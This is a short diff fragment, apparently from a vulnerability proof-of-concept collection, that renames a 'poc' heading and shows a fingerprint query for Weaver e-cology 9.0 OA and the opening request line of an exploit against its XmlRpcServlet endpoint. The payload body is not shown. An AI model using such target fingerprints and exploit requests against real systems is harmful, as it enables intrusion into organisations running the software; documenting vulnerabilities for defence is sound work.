@@ -8,7 +8,7 @@
 app.name=="泛微 e-cology 9.0 OA"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
